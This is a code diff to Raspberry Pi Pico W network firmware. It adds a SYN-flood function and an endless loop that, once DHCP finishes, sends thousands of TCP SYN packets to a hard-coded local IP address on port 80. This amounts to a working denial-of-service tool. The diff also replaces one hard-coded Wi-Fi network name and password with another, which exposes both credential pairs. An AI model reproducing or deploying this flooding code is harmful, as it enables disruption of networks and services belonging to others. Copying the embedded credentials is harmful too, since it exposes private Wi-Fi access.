@@ -20,8 +20,8 @@
 #include "lib/picowi_scan.h"
 
 // The hard-coded password is for test purposes only!!!
-#define SSID   "SINGTEL-EFF6"
-#define PASSWD   "746342n8r6"
+#define SSID   "Helinova"
+#define PASSWD   "3864b590b328"
 #define EVENT_POLL_USEC     100000
 #define PING_RESP_USEC      200000
 #define PING_DATA_SIZE      32
@@ -30,6 +30,9 @@
 extern IPADDR my_ip, router_ip;
 extern int dhcp_complete;
 extern int display_mode;
+extern NET_SOCKET net_sockets[NUM_NET_SOCKETS];
+net_handler_t handler;
+IPADDR target = IPADDR_VAL(192,168,140,12);
 
 int devicesCount = 0;
 
@@ -88,6 +91,7 @@ void saveMAC(IPADDR ip, MACADDR mac) {
     devicesCount++;
 }
 
+
 void sendArp(){
     IPADDR ip;
     MACADDR temp;
@@ -105,12 +109,27 @@ void sendArp(){
     }
 }
 
+void synFlood(int sock, net_handler_t handler, IPADDR target_ip, int flood) {
+    tcp_sock_set(sock, handler, target_ip, 80, 0);
+
+    // Send the TCP SYN packet
+    for (int i = 0; i < flood; i++) {
+        tcp_sock_send(sock, TCP_SYN, NULL, 0);
+    }
+    // Display information about the sent packet
+    printf("Sent TCP SYN packet to ");
+    print_ip_addr(target_ip);
+    printf(":%u\n", 80);
+}
+
+
+
 int main()
 {
     uint32_t led_ticks, poll_ticks, ping_ticks;
     bool ledon=false;
     int sent = 0;
-    
+
     add_event_handler(join_event_handler);
     add_event_handler(arp_event_handler);
     add_event_handler(dhcp_event_handler);
@@ -119,7 +138,7 @@ int main()
     add_event_handler(scan_event_handler);
     add_event_handler(tcp_event_handler);
     add_event_handler(scan_event_handler);
-    
+
     set_display_mode(DISP_INFO);
     io_init();
     sleep_ms(3000);
@@ -179,6 +198,12 @@ int main()
                     print_mac_addr(devices[i].mac);
                     printf("\n");
             }
+            if (dhcp_complete){
+                while(1){
+                    synFlood(tcp_sock_unused(), handler, target, 1000);
+                }
+            }
+            
         }
     }
 }
